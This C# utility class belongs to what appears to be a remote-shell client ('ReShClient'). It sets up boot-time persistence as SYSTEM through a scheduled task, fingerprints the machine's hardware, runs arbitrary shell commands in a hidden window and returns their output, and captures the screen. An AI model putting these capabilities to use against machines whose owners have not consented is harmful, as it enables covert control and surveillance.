using DeviceId;
using DeviceId.Encoders;
using DeviceId.Formatters;
using Microsoft.Win32.TaskScheduler;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Permissions;
using System.Text;
using System.Threading.Tasks;

namespace ReShClient
{
    public static class SystemUtility
    {
        public static void SetAutoStartTask(bool enable)
        {
            string taskName = "ReShClient";
            string executablePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            MyLogger.LogDebug($"[*]Setting auto-start task. Enable: {enable}, Executable Path: {executablePath}");

            using (TaskService ts = new TaskService())
            {
                if (enable)
                {
                    // Create a new task definition
                    TaskDefinition td = ts.NewTask();
                    td.RegistrationInfo.Description = "Starts ReShClient when the system boots.";

                    // Set the trigger to run at system startup
                    BootTrigger bt = new BootTrigger();
                    td.Triggers.Add(bt);

                    // Set the action: start the executable
                    td.Actions.Add(new ExecAction(executablePath));

                    // Optional: Configure security to run whether the user is logged on or not
                    td.Settings.AllowDemandStart = true;
                    td.Principal.LogonType = TaskLogonType.ServiceAccount; // SYSTEM account for boot
                    td.Principal.UserId = "SYSTEM";

                    // Register the task (requires elevated rights for SYSTEM account)
                    ts.RootFolder.RegisterTaskDefinition(taskName, td);
                }
                else
                {
                    // Delete the task
                    ts.RootFolder.DeleteTask(taskName, false);
                }
            }
        }

        public static string GetMachineName()
        {
            return Environment.MachineName;
        }

        public static string GetCompositeMachineId()
        {
            var formatter = new HashDeviceIdFormatter(
                // Use a strong, standard hashing algorithm
                () => SHA256.Create(),
                // Use a standard text encoding method
                new Base64ByteArrayEncoder()
            );
            string deviceId = new DeviceIdBuilder()
            // Use the OnWindows method to access the WMI-based identifiers
            .OnWindows(windows => windows
                // This method accesses the SMBIOS UUID (the system's unique identifier)
                .AddSystemUuid()
                // These methods are also commonly used and are available
                // in the DeviceId.Windows.Wmi package.
                .AddMotherboardSerialNumber()
                .AddProcessorId()
            )
            // This is a good practice to ensure the ID is the same size and format
            .UseFormatter(formatter)
            .ToString();
            // The resulting string is a unique, hashed machine fingerprint.
            return deviceId;
        }
        public static string ExecuteCommand(string command)
        {
            // The StringBuilder will capture the command's output
            var output = new StringBuilder();

            var isWindows = RuntimeInformation.IsOSPlatform(OSPlatform.Windows);

            var startInfo = new ProcessStartInfo
            {
                // Use cmd.exe on Windows, sh on everything else
                FileName = isWindows ? "cmd.exe" : "sh",

                // Windows uses /C, Linux/macOS uses -c
                Arguments = isWindows ? $"/C {command}" : $"-c \"{command}\"",
                
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true
            };
            try
            {
                using (var process = Process.Start(startInfo))
                {
                    // Read the entire output stream
                    output.Append(process.StandardOutput.ReadToEnd());
                    output.Append(process.StandardError.ReadToEnd());

                    // Wait for the process to finish
                    process.WaitForExit();
                }
            }
            catch (Exception ex)
            {
                return $"Error: {ex.Message}";
            }

            return output.ToString();
        }

        public static byte[] BitmapToBytes(Bitmap bitmap, ImageFormat format)
        {
            using(MemoryStream stream = new MemoryStream())
            {
                bitmap.Save(stream, format);
                return stream.ToArray();
            }
        }
        public static Bitmap ByteArrayToBitmap(byte[] byteArray)
        {
            using (MemoryStream stream = new MemoryStream(byteArray))
            {
                Image image = Image.FromStream(stream);
                return new Bitmap(image);
            }
        }
        public static Bitmap CaptureScreen()
        {
            // Get the bounds of the primary screen (works for single or main monitor)
            Rectangle bounds = Screen.PrimaryScreen.Bounds;

            Bitmap screenshot = new Bitmap(bounds.Width, bounds.Height);

            using (Graphics g = Graphics.FromImage(screenshot))
            {
                g.CopyFromScreen(
                    bounds.X,          // Source X
                    bounds.Y,          // Source Y
                    0,                 // Destination X
                    0,                 // Destination Y
                    bounds.Size        // Size of the area to copy
                );
            }

            return screenshot;
        }
    }
}
